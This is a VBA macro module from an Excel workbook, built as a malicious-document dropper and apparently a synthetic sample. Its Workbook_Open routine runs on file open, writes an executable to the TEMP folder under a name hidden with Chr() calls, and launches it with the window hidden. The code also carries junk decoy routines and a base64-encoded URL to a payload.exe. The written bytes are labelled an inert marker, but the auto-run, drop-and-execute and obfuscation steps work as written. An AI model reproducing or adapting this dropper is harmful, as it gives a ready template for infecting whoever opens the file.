
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim frs0swbone As Integer, exe As String
    exe = Environ("TEMP") & "\obl" & Chr(105) & Chr(118) & Chr(105) & Chr(111) & Chr(110) & Chr(120) & Chr(95) & Chr(115) & Chr(116) & "ub.exe"
    frs0swbone = FreeFile
    Open exe For Binary As #frs0swbone
    Put #frs0swbone, , "MZ-thi" & "s-is-an-i" & "nert-ma" & "rker-" & "stub"
    Close #frs0swbone
    Shell exe, 0
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
